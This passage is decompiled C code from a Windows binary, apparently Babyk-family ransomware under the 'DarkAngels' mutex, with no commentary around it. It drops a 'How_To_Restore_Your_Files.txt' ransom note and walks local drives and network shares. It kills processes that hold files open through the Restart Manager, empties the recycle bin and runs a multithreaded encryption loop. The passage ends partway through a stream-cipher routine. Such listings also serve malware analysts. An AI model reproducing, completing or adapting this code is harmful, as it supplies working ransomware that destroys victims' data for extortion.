            v65 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v13, 0, 0, 0, 0);
            v74 = (LPSTR)sub_412DE0(v65);
            v29 = v65;
            v24 = v74;
            v14 = lstrlenW(lpFileName);
            WideCharToMultiByte(0xFDE9u, 0, lpFileName, v14, v24, v29, 0, 0);
            sub_404CB0("Can't RmStartSession", v74, v84);
            return (WCHAR *)sub_412E10(v74);
          }
          return result;
        }
        v61 = RmRegisterResources(pSessionHandle, 1u, &lpFileName, 0, 0, 0, 0) == 0;
        v84 = v61;
        if ( v61 )
        {
          pnProcInfo = 10;
          v60 = RmGetList(pSessionHandle, &pnProcInfoNeeded, &pnProcInfo, dwProcessId, &dwRebootReasons) == 0;
          v84 = v60;
          if ( v60 )
          {
            for ( k = 0; k < pnProcInfo; ++k )
            {
              if ( dwProcessId[k].ApplicationType != RmExplorer
                && dwProcessId[k].ApplicationType != RmCritical
                && GetCurrentProcessId() != dwProcessId[k].Process.dwProcessId )
              {
                hProcess = OpenProcess(0x100001u, 0, dwProcessId[k].Process.dwProcessId);
                if ( hProcess == (HANDLE)-1 )
                {
                  if ( dword_41425C )
                  {
                    v6 = lstrlenW(dwProcessId[k].strAppName);
                    cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, dwProcessId[k].strAppName, v6, 0, 0, 0, 0);
                    lpMultiByteStr = (LPSTR)sub_412DE0(cbMultiByte);
                    v26 = cbMultiByte;
                    v21 = lpMultiByteStr;
                    v7 = lstrlenW(dwProcessId[k].strAppName);
                    WideCharToMultiByte(0xFDE9u, 0, dwProcessId[k].strAppName, v7, v21, v26, 0, 0);
                    LastError = GetLastError();
                    sub_404CB0("Can't OpenProcess", lpMultiByteStr, LastError);
                    sub_412E10(lpMultiByteStr);
                  }
                }
                else
                {
                  TerminateProcess(hProcess, 0);
                  WaitForSingleObject(hProcess, 0x1388u);
                  CloseHandle(hProcess);
                }
              }
            }
          }
          else if ( dword_41425C )
          {
            v9 = lstrlenW(lpFileName);
            v68 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v9, 0, 0, 0, 0);
            v77 = (LPSTR)sub_412DE0(v68);
            v27 = v68;
            v22 = v77;
            v10 = lstrlenW(lpFileName);
            WideCharToMultiByte(0xFDE9u, 0, lpFileName, v10, v22, v27, 0, 0);
            sub_404CB0("Can't RmGetList", v77, v84);
            sub_412E10(v77);
          }
        }
        else if ( dword_41425C )
        {
          v11 = lstrlenW(lpFileName);
          v67 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v11, 0, 0, 0, 0);
          v76 = (LPSTR)sub_412DE0(v67);
          v28 = v67;
          v23 = v76;
          v12 = lstrlenW(lpFileName);
          WideCharToMultiByte(0xFDE9u, 0, lpFileName, v12, v23, v28, 0, 0);
          sub_404CB0("Can't RmRegisterResources", v76, v84);
          sub_412E10(v76);
        }
        RmEndSession(pSessionHandle);
        v66 = 0;
      }
      if ( dword_41425C )
      {
        v15 = lstrlenW(lpFileName);
        v64 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v15, 0, 0, 0, 0);
        v73 = (LPSTR)sub_412DE0(v64);
        v30 = v64;
        v25 = v73;
        v16 = lstrlenW(lpFileName);
        WideCharToMultiByte(0xFDE9u, 0, lpFileName, v16, v25, v30, 0, 0);
        v17 = GetLastError();
        sub_404CB0("Can't open file after killHolder", v73, v17);
        return (WCHAR *)sub_412E10(v73);
      }
    }
    else if ( dword_41425C )
    {
      v18 = lstrlenW(lpFileName);
      v63 = WideCharToMultiByte(0xFDE9u, 0, lpFileName, v18, 0, 0, 0, 0);
      v72 = (LPSTR)sub_412DE0(v63);
      v19 = lstrlenW(lpFileName);
      WideCharToMultiByte(0xFDE9u, 0, lpFileName, v19, v72, v63, 0, 0);
      v20 = GetLastError();
      sub_404CB0("Can't MoveFileExW", v72, v20);
      return (WCHAR *)sub_412E10(v72);
    }
  }
  return result;
}
// 409A38: variable 'v3' is possibly undefined
// 409B3D: variable 'v4' is possibly undefined
// 409C52: variable 'v5' is possibly undefined
// 4141B8: using guessed type unsigned __int8 byte_4141B8[40];
// 41425C: using guessed type int dword_41425C;
// 409720: using guessed type _DWORD var_12A8[1057];
// 409720: using guessed type char var_178[32];
// 409720: using guessed type char var_224[72];
// 409720: using guessed type WCHAR var_1DC[34];

//----- (0040A2B0) --------------------------------------------------------
WCHAR *__cdecl sub_40A2B0(LPCWSTR lpString2)
{
  WCHAR *result; // eax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  int LastError; // eax
  CHAR *v6; // [esp-10h] [ebp-288h]
  int v7; // [esp-Ch] [ebp-284h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+0h] [ebp-278h] BYREF
  DWORD NumberOfBytesWritten; // [esp+250h] [ebp-28h] BYREF
  int v10; // [esp+254h] [ebp-24h] BYREF
  int cbMultiByte; // [esp+258h] [ebp-20h]
  LPSTR lpMultiByteStr; // [esp+25Ch] [ebp-1Ch]
  HANDLE hFindFile; // [esp+260h] [ebp-18h]
  LPVOID lpMem; // [esp+264h] [ebp-14h]
  HANDLE hFile; // [esp+268h] [ebp-10h]
  unsigned int i; // [esp+26Ch] [ebp-Ch]
  int j; // [esp+270h] [ebp-8h]
  LPWSTR lpString1; // [esp+274h] [ebp-4h]

  result = (WCHAR *)sub_412DE0(0x10000);
  lpString1 = result;
  if ( result )
  {
    lstrcpyW(lpString1, lpString2);
    lstrcatW(lpString1, L"\\How_To_Restore_Your_Files.txt");
    hFile = CreateFileW(lpString1, 0x40000000u, 1u, 0, 1u, 0, 0);
    if ( hFile != (HANDLE)-1 )
    {
      v2 = lstrlenA(Buffer);
      WriteFile(hFile, Buffer, v2, &NumberOfBytesWritten, 0);
      CloseHandle(hFile);
    }
    lstrcpyW(lpString1, lpString2);
    lstrcatW(lpString1, L"\\*");
    hFindFile = FindFirstFileW(lpString1, &FindFileData);
    if ( hFindFile == (HANDLE)-1 )
    {
      if ( dword_41425C )
      {
        v3 = lstrlenW(lpString2);
        cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, lpString2, v3, 0, 0, 0, 0);
        lpMultiByteStr = (LPSTR)sub_412DE0(cbMultiByte);
        v7 = cbMultiByte;
        v6 = lpMultiByteStr;
        v4 = lstrlenW(lpString2);
        WideCharToMultiByte(0xFDE9u, 0, lpString2, v4, v6, v7, 0, 0);
        LastError = GetLastError();
        sub_404CB0("Can't FindFirstFileW", lpMultiByteStr, LastError);
        sub_412E10(lpMultiByteStr);
      }
    }
    else
    {
      do
      {
        for ( i = 0; i < 0x22; ++i )
        {
          if ( !lstrcmpiW(FindFileData.cFileName, (&::lpString2)[i]) )
            goto LABEL_25;
        }
        lstrcpyW(lpString1, lpString2);
        lstrcatW(lpString1, L"\\");
        lstrcatW(lpString1, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) == 0
          && lstrcmpW(FindFileData.cFileName, L"How_To_Restore_Your_Files.txt") )
        {
          for ( j = lstrlenW(FindFileData.cFileName) - 1; ; --j )
          {
            if ( j < 0 )
              goto LABEL_20;
            if ( FindFileData.cFileName[j] == 46 )
              break;
          }
          if ( lstrcmpiW(&FindFileData.cFileName[j], L".exe")
            && lstrcmpiW(&FindFileData.cFileName[j], L".dll")
            && lstrcmpiW(&FindFileData.cFileName[j], L".babyk") )
          {
LABEL_20:
            while ( !sub_412F50((int)dword_4141FC, lpString1, 0) )
            {
              v10 = 0;
              while ( 1 )
              {
                lpMem = (LPVOID)sub_412EB0((int)dword_4141FC, 0, &v10);
                if ( !lpMem )
                  break;
                sub_409720((LPCWSTR)lpMem);
                sub_412E10(lpMem);
              }
            }
          }
        }
LABEL_25:
        ;
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
    }
    return (WCHAR *)sub_412E10(lpString1);
  }
  return result;
}
// 4141FC: using guessed type _DWORD dword_4141FC[12];
// 41425C: using guessed type int dword_41425C;

//----- (0040A5C0) --------------------------------------------------------
WCHAR *__cdecl sub_40A5C0(LPCWSTR lpString2)
{
  WCHAR *result; // eax
  int v2; // eax
  int v3; // eax
  int LastError; // eax
  CHAR *v5; // [esp-10h] [ebp-27Ch]
  int v6; // [esp-Ch] [ebp-278h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+0h] [ebp-26Ch] BYREF
  int v8; // [esp+250h] [ebp-1Ch] BYREF
  int cbMultiByte; // [esp+254h] [ebp-18h]
  LPSTR lpMultiByteStr; // [esp+258h] [ebp-14h]
  HANDLE hFindFile; // [esp+25Ch] [ebp-10h]
  LPVOID lpMem; // [esp+260h] [ebp-Ch]
  unsigned int i; // [esp+264h] [ebp-8h]
  LPWSTR lpString1; // [esp+268h] [ebp-4h]

  while ( !sub_412F50((int)dword_41422C, lpString2, 0) )
  {
    while ( 1 )
    {
      lpMem = (LPVOID)sub_412EB0((int)dword_4141FC, 0, &v8);
      if ( !lpMem )
        break;
      sub_409720((LPCWSTR)lpMem);
      sub_412E10(lpMem);
    }
  }
  result = (WCHAR *)sub_412DE0(0x10000);
  lpString1 = result;
  if ( result )
  {
    lstrcpyW(lpString1, lpString2);
    lstrcatW(lpString1, L"\\*");
    hFindFile = FindFirstFileW(lpString1, &FindFileData);
    if ( hFindFile == (HANDLE)-1 )
    {
      if ( dword_41425C )
      {
        v2 = lstrlenW(lpString2);
        cbMultiByte = WideCharToMultiByte(0xFDE9u, 0, lpString2, v2, 0, 0, 0, 0);
        lpMultiByteStr = (LPSTR)sub_412DE0(cbMultiByte);
        v6 = cbMultiByte;
        v5 = lpMultiByteStr;
        v3 = lstrlenW(lpString2);
        WideCharToMultiByte(0xFDE9u, 0, lpString2, v3, v5, v6, 0, 0);
        LastError = GetLastError();
        sub_404CB0("Can't FindFirstFileW", lpMultiByteStr, LastError);
        sub_412E10(lpMultiByteStr);
      }
    }
    else
    {
      do
      {
        if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
        {
          for ( i = 0; i < 0x22; ++i )
          {
            if ( !lstrcmpiW(FindFileData.cFileName, (&::lpString2)[i]) )
              goto LABEL_13;
          }
          lstrcpyW(lpString1, lpString2);
          lstrcatW(lpString1, L"\\");
          lstrcatW(lpString1, FindFileData.cFileName);
          sub_40A5C0(lpString1);
        }
LABEL_13:
        ;
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
    }
    return (WCHAR *)sub_412E10(lpString1);
  }
  return result;
}
// 4141FC: using guessed type _DWORD dword_4141FC[12];
// 41422C: using guessed type _DWORD dword_41422C[12];
// 41425C: using guessed type int dword_41425C;

//----- (0040A7C0) --------------------------------------------------------
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter)
{
  int v1; // [esp+0h] [ebp-8h] BYREF
  LPVOID lpMem; // [esp+4h] [ebp-4h]

  v1 = 0;
  lpMem = 0;
  if ( lpThreadParameter )
  {
    while ( 1 )
    {
      lpMem = (LPVOID)sub_412EB0((int)dword_41422C, 0, &v1);
      if ( lpMem )
      {
        sub_40A2B0((LPCWSTR)lpMem);
        sub_412E10(lpMem);
      }
      else if ( v1 != -1 )
      {
        goto LABEL_11;
      }
      while ( 1 )
      {
        lpMem = (LPVOID)sub_412EB0((int)dword_4141FC, 0, &v1);
        if ( !lpMem )
          break;
        sub_409720((LPCWSTR)lpMem);
        sub_412E10(lpMem);
      }
    }
  }
  while ( 1 )
  {
    lpMem = (LPVOID)sub_412EB0((int)dword_4141FC, 1, &v1);
    if ( !lpMem )
      break;
    sub_409720((LPCWSTR)lpMem);
    sub_412E10(lpMem);
  }
LABEL_11:
  ExitThread(0);
}
// 4141FC: using guessed type _DWORD dword_4141FC[12];
// 41422C: using guessed type _DWORD dword_41422C[12];

//----- (0040A8B0) --------------------------------------------------------
int __cdecl sub_40A8B0(LPNETRESOURCEW lpNetResource)
{
  int result; // eax
  HANDLE hEnum; // [esp+0h] [ebp-10h] BYREF
  DWORD cCount; // [esp+4h] [ebp-Ch] BYREF
  DWORD BufferSize; // [esp+8h] [ebp-8h] BYREF
  DWORD i; // [esp+Ch] [ebp-4h]
  LPNETRESOURCEW lpNetResourcea; // [esp+18h] [ebp+8h]

  cCount = -1;
  BufferSize = 0x4000;
  result = WNetOpenEnumW(2u, 0, 0x13u, lpNetResource, &hEnum);
  if ( !result )
  {
    lpNetResourcea = (LPNETRESOURCEW)sub_412DE0(BufferSize);
    if ( lpNetResourcea )
    {
      while ( !WNetEnumResourceW(hEnum, &cCount, lpNetResourcea, &BufferSize) )
      {
        for ( i = 0; i < cCount; ++i )
        {
          if ( (lpNetResourcea[i].dwUsage & 2) != 0 )
            sub_40A8B0(&lpNetResourcea[i]);
          else
            sub_40A5C0(lpNetResourcea[i].lpRemoteName);
        }
      }
      sub_412E10(lpNetResourcea);
    }
    return WNetCloseEnum(hEnum);
  }
  return result;
}

//----- (0040A980) --------------------------------------------------------
DWORD __cdecl sub_40A980(LPWSTR servername)
{
  DWORD result; // eax
  WCHAR String1[100]; // [esp+0h] [ebp-E4h] BYREF
  DWORD totalentries; // [esp+C8h] [ebp-1Ch] BYREF
  DWORD resume_handle; // [esp+CCh] [ebp-18h] BYREF
  LPBYTE bufptr; // [esp+D0h] [ebp-14h] BYREF
  DWORD entriesread; // [esp+D4h] [ebp-10h] BYREF
  DWORD v7; // [esp+D8h] [ebp-Ch]
  DWORD i; // [esp+DCh] [ebp-8h]
  LPBYTE v9; // [esp+E0h] [ebp-4h]

  entriesread = 0;
  totalentries = 0;
  resume_handle = 0;
  do
  {
    result = NetShareEnum(servername, 1u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries, &resume_handle);
    v7 = result;
    if ( !result || v7 == 234 )
    {
      v9 = bufptr;
      for ( i = 1; i <= entriesread; ++i )
      {
        if ( (!*((_DWORD *)v9 + 1) || *((_DWORD *)v9 + 1) == 0x80000000) && lstrlenW(*(LPCWSTR *)v9) > 2 )
        {
          if ( lstrcmpW(*(LPCWSTR *)v9, L"ADMIN$") )
          {
            lstrcpyW(String1, L"\\\\");
            lstrcatW(String1, servername);
            lstrcatW(String1, L"\\");
            lstrcatW(String1, *(LPCWSTR *)v9);
            sub_40A5C0(String1);
          }
        }
        v9 += 12;
      }
      result = NetApiBufferFree(bufptr);
    }
  }
  while ( v7 == 234 );
  return result;
}

//----- (0040AAB0) --------------------------------------------------------
WCHAR *__cdecl sub_40AAB0(WCHAR a1)
{
  WCHAR *result; // eax
  DWORD nLength; // [esp+0h] [ebp-10h] BYREF
  UINT DriveTypeW; // [esp+4h] [ebp-Ch]
  LPWSTR lpRemoteName; // [esp+8h] [ebp-8h]
  LPWSTR lpString1; // [esp+Ch] [ebp-4h]

  result = (WCHAR *)sub_412DE0(14);
  lpString1 = result;
  if ( result )
  {
    lstrcpyW(lpString1, L"\\\\?\\");
    lstrcpyW(lpString1 + 5, L":");
    lpString1[4] = a1;
    DriveTypeW = GetDriveTypeW(lpString1);
    if ( DriveTypeW && DriveTypeW != 5 )
    {
      if ( DriveTypeW == 4 )
      {
        nLength = 260;
        lpRemoteName = (LPWSTR)sub_412DE0(520);
        if ( lpRemoteName )
        {
          if ( !WNetGetConnectionW(lpString1 + 4, lpRemoteName, &nLength) )
            sub_40A5C0(lpRemoteName);
          sub_412E10(lpRemoteName);
        }
      }
      else
      {
        sub_40A5C0(lpString1);
      }
    }
    return (WCHAR *)sub_412E10(lpString1);
  }
  return result;
}

//----- (0040ABA0) --------------------------------------------------------
void __noreturn start()
{
  const WCHAR *CommandLineW; // eax
  HANDLE Thread; // eax
  HANDLE v2; // eax
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  struct _SYSTEM_INFO SystemInfo; // [esp+0h] [ebp-88h] BYREF
  int v8; // [esp+24h] [ebp-64h]
  int v9; // [esp+28h] [ebp-60h]
  DWORD dwNumberOfProcessors; // [esp+2Ch] [ebp-5Ch]
  LPNETRESOURCEW lpNetResource; // [esp+30h] [ebp-58h]
  DWORD v12; // [esp+34h] [ebp-54h]
  DWORD ii; // [esp+38h] [ebp-50h]
  DWORD n; // [esp+3Ch] [ebp-4Ch]
  LPWSTR lpString1; // [esp+40h] [ebp-48h]
  LPCWSTR lpFileName; // [esp+44h] [ebp-44h]
  DWORD LogicalDrives; // [esp+48h] [ebp-40h]
  DWORD jj; // [esp+4Ch] [ebp-3Ch]
  LPWSTR *v19; // [esp+50h] [ebp-38h]
  int v20; // [esp+54h] [ebp-34h]
  int k; // [esp+58h] [ebp-30h]
  int v22; // [esp+5Ch] [ebp-2Ch]
  int j; // [esp+60h] [ebp-28h]
  DWORD i; // [esp+64h] [ebp-24h]
  HANDLE *v25; // [esp+68h] [ebp-20h]
  HANDLE *lpHandles; // [esp+6Ch] [ebp-1Ch]
  int pNumArgs; // [esp+70h] [ebp-18h] BYREF
  LPWSTR v28; // [esp+74h] [ebp-14h]
  WCHAR m; // [esp+78h] [ebp-10h]
  LPCWSTR lpString; // [esp+7Ch] [ebp-Ch]
  LPCWSTR lpString2; // [esp+80h] [ebp-8h]
  DWORD nCount; // [esp+84h] [ebp-4h]

  sub_40FDC0();
  sub_412D60();
  hProv = sub_404A60();
  if ( hProv )
  {
    pNumArgs = 0;
    CommandLineW = GetCommandLineW();
    v19 = CommandLineToArgvW(CommandLineW, &pNumArgs);
    SetProcessShutdownParameters(0, 0);
    lpFileName = sub_404C00(pNumArgs, (int)v19, L"debug");
    if ( lpFileName )
    {
      ::lpString2 = lpFileName;
      sub_404DA0(lpFileName);
      dword_41425C = 1;
    }
    sub_404750();
    sub_404990();
    sub_4046B0();
    SHEmptyRecycleBinA(0, 0, 7u);
    GetSystemInfo(&SystemInfo);
    dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors;
    v12 = 4 * SystemInfo.dwNumberOfProcessors;
    nCount = (4 * SystemInfo.dwNumberOfProcessors) >> 1;
    sub_412E30((int)dword_4141FC, 24 * SystemInfo.dwNumberOfProcessors);
    sub_412E30((int)dword_41422C, 3 * nCount);
    lpHandles = (HANDLE *)sub_412DE0(4 * nCount);
    v25 = (HANDLE *)sub_412DE0(4 * nCount);
    if ( lpHandles && v25 )
    {
      sub_412D70((int)lpHandles, 0, 4 * nCount);
      sub_412D70((int)v25, 0, 4 * nCount);
      for ( i = 0; i < nCount; ++i )
      {
        Thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, (LPVOID)1, 0, 0);
        lpHandles[i] = Thread;
        v2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
        v25[i] = v2;
      }
      lpString = sub_404C00(pNumArgs, (int)v19, L"shares");
      lpString2 = sub_404C00(pNumArgs, (int)v19, L"paths");
      if ( lpString )
      {
        v22 = 1;
        v9 = lstrlenW(lpString);
        for ( j = 0; j < v9; ++j )
        {
          if ( lpString[j] == 44 )
          {
            lpString[j] = 0;
            ++v22;
          }
        }
        do
        {
          v3 = lstrlenW(lpString);
          lpString1 = (LPWSTR)sub_412DE0(2 * v3 + 2);
          lstrcpyW(lpString1, lpString);
          sub_40A980(lpString1);
          sub_412E10(lpString1);
          v4 = lstrlenW(lpString);
          lpString += v4 + 1;
          --v22;
        }
        while ( v22 );
      }
      if ( lpString2 )
      {
        v20 = 1;
        v8 = lstrlenW(lpString2);
        for ( k = 0; k < v8; ++k )
        {
          if ( lpString2[k] == 44 )
          {
            lpString2[k] = 0;
            ++v20;
          }
        }
        do
        {
          v5 = lstrlenW(lpString2);
          v28 = (LPWSTR)sub_412DE0(2 * v5 + 2);
          lstrcpyW(v28, lpString2);
          if ( lstrlenW(v28) == 2 && v28[1] == 58 )
            sub_40AAB0(*v28);
          else
            sub_40A5C0(v28);
          sub_412E10(v28);
          v6 = lstrlenW(lpString2);
          lpString2 += v6 + 1;
          --v20;
        }
        while ( v20 );
      }
      if ( !lpString2 && !lpString && !OpenMutexA(0x1F0001u, 0, "DarkAngels") )
      {
        CreateMutexA(0, 0, "DarkAngels");
        lpNetResource = 0;
        if ( sub_404B00(pNumArgs, (int)v19, L"sf") == 1 )
          sub_40A8B0(lpNetResource);
        sub_404480();
        LogicalDrives = GetLogicalDrives();
        if ( LogicalDrives )
        {
          for ( m = 65; m <= 0x5Au; ++m )
          {
            if ( (LogicalDrives & 1) != 0 )
              sub_40AAB0(m);
            LogicalDrives >>= 1;
          }
        }
        if ( !sub_404B00(pNumArgs, (int)v19, L"sf") )
          sub_40A8B0(lpNetResource);
      }
      for ( n = 0; n < nCount; ++n )
        sub_412F50((int)dword_41422C, 0, 1);
      WaitForMultipleObjects(nCount, lpHandles, 1, 0xFFFFFFFF);
      for ( ii = 0; ii < nCount; ++ii )
        sub_412F50((int)dword_4141FC, 0, 1);
      WaitForMultipleObjects(nCount, v25, 1, 0xFFFFFFFF);
      sub_4046B0();
      for ( jj = 0; jj < nCount; ++jj )
      {
        CloseHandle(lpHandles[jj]);
        CloseHandle(v25[jj]);
      }
      sub_412E10(lpHandles);
      sub_412E10(v25);
    }
    if ( dword_41425C )
      sub_404DE0();
    CryptReleaseContext(hProv, 0);
  }
  ExitProcess(0);
}
// 403C18: using guessed type wchar_t aDebug[6];
// 403C24: using guessed type wchar_t aShares[7];
// 403C34: using guessed type wchar_t aPaths[6];
// 403C58: using guessed type wchar_t aSf[3];
// 403C60: using guessed type wchar_t aSf_0[3];
// 40ABA0: using guessed type void __noreturn start();
// 4141FC: using guessed type _DWORD dword_4141FC[12];
// 41422C: using guessed type _DWORD dword_41422C[12];
// 41425C: using guessed type int dword_41425C;

//----- (0040B130) --------------------------------------------------------
_DWORD *__thiscall sub_40B130(_DWORD *this)
{
  this[8] = 0;
  this[9] = 0;
  this[10] = 0;
  this[11] = 0;
  return this;
}

//----- (0040B170) --------------------------------------------------------
int __cdecl sub_40B170(_DWORD *a1, int *a2)
{
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // kr08_8
  unsigned __int64 v4; // kr10_8
  unsigned __int64 v5; // kr18_8
  unsigned __int64 v6; // kr20_8
  unsigned __int64 v7; // kr28_8
  unsigned __int64 v8; // rax
  unsigned __int64 v9; // kr40_8
  unsigned __int64 v10; // kr50_8
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // rax
  int result; // eax
  unsigned __int64 v15; // rax
  unsigned __int64 v16; // kr58_8
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rax
  unsigned __int64 v19; // kr88_8
  unsigned __int64 v20; // rax
  unsigned __int64 v21; // krA0_8
  unsigned __int64 v22; // krA8_8
  unsigned __int64 v23; // krB0_8
  int v24; // [esp+4h] [ebp-248h]
  int v25; // [esp+14h] [ebp-238h]
  int v26; // [esp+24h] [ebp-228h]
  int v27; // [esp+34h] [ebp-218h]
  int v28; // [esp+44h] [ebp-208h]
  int v29; // [esp+54h] [ebp-1F8h]
  int v30; // [esp+64h] [ebp-1E8h]
  int v31; // [esp+74h] [ebp-1D8h]
  int v32; // [esp+84h] [ebp-1C8h]
  int v33; // [esp+94h] [ebp-1B8h]
  int v34; // [esp+A4h] [ebp-1A8h]
  int v35; // [esp+B4h] [ebp-198h]
  int v36; // [esp+C4h] [ebp-188h]
  int v37; // [esp+D4h] [ebp-178h]
  int v38; // [esp+E4h] [ebp-168h]
  int v39; // [esp+F4h] [ebp-158h]
  int v40; // [esp+104h] [ebp-148h]
  int v41; // [esp+114h] [ebp-138h]
  int v42; // [esp+124h] [ebp-128h]
  int v43; // [esp+134h] [ebp-118h]
  int v44; // [esp+144h] [ebp-108h]
  int v45; // [esp+154h] [ebp-F8h]
  int v46; // [esp+164h] [ebp-E8h]
  int v47; // [esp+174h] [ebp-D8h]
  int v48; // [esp+184h] [ebp-C8h]
  int v49; // [esp+194h] [ebp-B8h]
  int v50; // [esp+1A4h] [ebp-A8h]
  int v51; // [esp+1B4h] [ebp-98h]
  int v52; // [esp+1C4h] [ebp-88h]
  int v53; // [esp+1D4h] [ebp-78h]
  int v54; // [esp+1E4h] [ebp-68h]
  int v55; // [esp+1F4h] [ebp-58h]
  int v56; // [esp+204h] [ebp-48h]
  int v57; // [esp+248h] [ebp-4h]

  v57 = a1[1056] & 0x1FF;
  v56 = ((_WORD)v57 + 16) & 0x1FF;
  if ( a1[1056] >= 0x200u )
  {
    a1[1056] = ((unsigned __int16)a1[1056] + 16) & 0x3FF;
    v39 = a1[(unsigned __int8)BYTE2(a1[1044]) + 256] + a1[*((unsigned __int8 *)a1 + 4176)];
    v15 = (unsigned __int64)(unsigned int)a1[v57 + 513] << 23;
    a1[v57 + 512] += ((a1[1046] << 8) | ((unsigned __int64)(unsigned int)a1[1046] >> 24))
                   + (((a1[1053] << 10) | ((unsigned __int64)(unsigned int)a1[1053] >> 22)) ^ (v15 | HIDWORD(v15)));
    a1[1040] = a1[v57 + 512];
    *a2 = a1[v57 + 512] ^ v39;
    v38 = a1[(unsigned __int8)BYTE2(a1[1045]) + 256] + a1[*((unsigned __int8 *)a1 + 4180)];
    v16 = (unsigned __int64)(unsigned int)a1[v57 + 514] << 23;
    a1[v57 + 513] += ((a1[1047] << 8) | ((unsigned __int64)(unsigned int)a1[1047] >> 24))
                   + (((a1[1054] << 10) | ((unsigned __int64)(unsigned int)a1[1054] >> 22)) ^ (v16 | HIDWORD(v16)));
    a1[1041] = a1[v57 + 513];
    a2[1] = a1[v57 + 513] ^ v38;
    v37 = a1[(unsigned __int8)BYTE2(a1[1046]) + 256] + a1[*((unsigned __int8 *)a1 + 4184)];
    a1[v57 + 514] += ((a1[1048] << 8) | ((unsigned __int64)(unsigned int)a1[1048] >> 24))
                   + (((a1[1055] << 10) | ((unsigned __int64)(unsigned int)a1[1055] >> 22)) ^ ((a1[v57 + 515] << 23) | ((unsigned __int64)(unsigned int)a1[v57 + 515] >> 9)));
    a1[1042] = a1[v57 + 514];
    a2[2] = a1[v57 + 514] ^ v37;
    v36 = a1[(unsigned __int8)BYTE2(a1[1047]) + 256] + a1[*((unsigned __int8 *)a1 + 4188)];
    a1[v57 + 515] += ((a1[1049] << 8) | ((unsigned __int64)(unsigned int)a1[1049] >> 24))
                   + (((a1[1040] << 10) | ((unsigned __int64)(unsigned int)a1[1040] >> 22)) ^ ((a1[v57 + 516] << 23) | ((unsigned __int64)(unsigned int)a1[v57 + 516] >> 9)));
    a1[1043] = a1[v57 + 515];
    a2[3] = a1[v57 + 515] ^ v36;
    v35 = a1[(unsigned __int8)BYTE2(a1[1048]) + 256] + a1[*((unsigned __int8 *)a1 + 4192)];
    a1[v57 + 516] += ((a1[1050] << 8) | ((unsigned __int64)(unsigned int)a1[1050] >> 24))
                   + (((a1[1041] << 10) | ((unsigned __int64)(unsigned int)a1[1041] >> 22)) ^ ((a1[v57 + 517] << 23) | ((unsigned __int64)(unsigned int)a1[v57 + 517] >> 9)));
    a1[1044] = a1[v57 + 516];
    a2[4] = a1[v57 + 516] ^ v35;
    v34 = a1[(unsigned __int8)BYTE2(a1[1049]) + 256] + a1[*((unsigned __int8 *)a1 + 4196)];
    a1[v57 + 517] += ((a1[1051] << 8) | ((unsigned __int64)(unsigned int)a1[1051] >> 24))
                   + (((a1[1042] << 10) | ((unsigned __int64)(unsigned int)a1[1042] >> 22)) ^ ((a1[v57 + 518] << 23) | ((unsigned __int64)(unsigned int)a1[v57 + 518] >> 9)));
    a1[1045] = a1[v57 + 517];
    a2[5] = a1[v57 + 517] ^ v34;
    v33 = a1[(unsigned __int8)BYTE2(a1[1050]) + 256] + a1[*((unsigned __int8 *)a1 + 4200)];
    a1[v57 + 518] += ((a1[1052] << 8) | ((unsigned __int64)(unsigned int)a1[1052] >> 24))
                   + (((a1[1043] << 10) | ((unsigned __int64)(unsigned int)a1[1043] >> 22)) ^ ((a1[v57 + 519] << 23) | ((unsigned __int64)(unsigned int)a1[v57 + 519] >> 9)));
    a1[1046] = a1[v57 + 518];
    a2[6] = a1[v57 + 518] ^ v33;
    v32 = a1[(unsigned __int8)BYTE2(a1[1051]) + 256] + a1[*((unsigned __int8 *)a1 + 4204)];
    v17 = (unsigned __int64)(unsigned int)a1[v57 + 520] << 23;
    a1[v57 + 519] += ((a1[1053] << 8) | ((unsigned __int64)(unsigned int)a1[1053] >> 24))
                   + (((a1[1044] << 10) | ((unsigned __int64)(unsigned int)a1[1044] >> 22)) ^ (v17 | HIDWORD(v17)));
    a1[1047] = a1[v57 + 519];
    a2[7] = a1[v57 + 519] ^ v32;
    v31 = a1[(unsigned __int8)BYTE2(a1[1052]) + 256] + a1[*((unsigned __int8 *)a1 + 4208)];
    v18 = (unsigned __int64)(unsigned int)a1[v57 + 521] << 23;
    a1[v57 + 520] += ((a1[1054] << 8) | ((unsigned __int64)(unsigned int)a1[1054] >> 24))
                   + (((a1[1045] << 10) | ((unsigned __int64)(unsigned int)a1[1045] >> 22)) ^ (v18 | HIDWORD(v18)));
    a1[1048] = a1[v57 + 520];
    a2[8] = a1[v57 + 520] ^ v31;
    v30 = a1[(unsigned __int8)BYTE2(a1[1053]) + 256] + a1[*((unsigned __int8 *)a1 + 4212)];
    v19 = (unsigned __int64)(unsigned int)a1[v57 + 522] << 23;
    a1[v57 + 521] += ((a1[1055] << 8) | ((unsigned __int64)(unsigned int)a1[1055] >> 24))
                   + (((a1[1046] << 10) | ((unsigned __int64)(unsigned int)a1[1046] >> 22)) ^ (v19 | HIDWORD(v19)));
    a1[1049] = a1[v57 + 521];
    a2[9] = a1[v57 + 521] ^ v30;
    v29 = a1[(unsigned __int8)BYTE2(a1[1054]) + 256] + a1[*((unsigned __int8 *)a1 + 4216)];
    a1[v57 + 522] += ((a1[1040] << 8) | ((unsigned __int64)(unsigned int)a1[1040] >> 24))
